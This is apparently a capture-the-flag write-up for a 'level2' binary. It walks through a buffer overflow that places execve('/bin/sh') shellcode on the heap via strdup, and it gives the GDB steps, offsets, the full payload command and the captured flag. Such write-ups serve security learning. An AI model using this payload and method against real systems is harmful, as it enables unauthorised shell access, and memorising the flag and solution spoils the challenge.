# level2

We find an executable `level2`. We run `gdb level2` to examine it.

A `main` calls a `p` function, which seems to do a `gets`, compare an address, and run an `strdup` if the check fails.

This time, the executable doesn't call `system` ; we'll have to do it ourselves, with **shellcode**. Instead of filling our buffer with `A`, we're gonna fill it with executable code in hexadecimal.

There's a subtlety here : usually, we could run the code by directly pointing our return address to the buffer. But here, all stack addresses start with `0xb` - which is exactly what is checked by the `p` function. We'll have to use the heap by taking advantage of the `strdup` (which will duplicate our shellcode there) and setting our `eip` register to wherever `strdup` copies our buffer.

## **The exploit**

We need three things :

- The size of the buffer until `eip`
- A shellcode
- The address we're jumping to

We fill the beginning of the buffer with `NOP` instructions, which if read will simply direct to our shellcode.

We'll have something like this :

```
python2 -c 'print(NOP_INSTRUCTION * (BUFFER_SIZE - SHELLCODE_SIZE) + SHELLCODE + DESIRED_ADDRESS)'
```

## **Size of the buffer**

In GDB, we can run
```
i r $ebp
```
to get the ebp register's address. We get `0xbffff718`, which means `eip` is at `0xbffff71c` (4 bytes behind).

We adjust the `x/NUMBERxw $esp` command to show us the bytes from `esp` to `eip`.
```
x/28xw $esp
```
seems to do the trick.

We can tell the buffer starts at `0xbffff6cc` by inputting a bunch of `A`'s and checking where the `0x41414141` starts.

A quick `python2 -c "print(0xbffff71c - 0xbffff6cc)"` tells us the "buffer size" : `80`.

## **Shellcode**

For the shellcode, no need to reinvent the wheel. There are plenty of existing shellcodes on the internet.

On [this website](https://beta.hackndo.com/buffer-overflow/), we find the following shellcode, which is equivalent to `system("/bin/sh");` :

```
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```

## **Address**

Finally, we need the target address. We want something on the heap, so the place where `strdup` copies the buffer would be good.

We set a breakpoint after `strdup` with `break *p+105` and check the value of `eax` with :

```
p/x $eax
```

We get `0x804a008`.

## **The command**

Now we can substitute :

```
python2 -c 'print("\x90" * 35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x08\xa0\x04\x08")'
```

Finally, we have to pipe it into the executable. Same as before, we run :

```
( python2 -c 'print("\x90" * 35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x08\xa0\x04\x08")' ; cat ) | ./level2
```

## **The flag**

It works ! In our interactive shell, we run :

```
cat /home/user/level3/.pass
```

... and get the flag for `level2` :

```
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```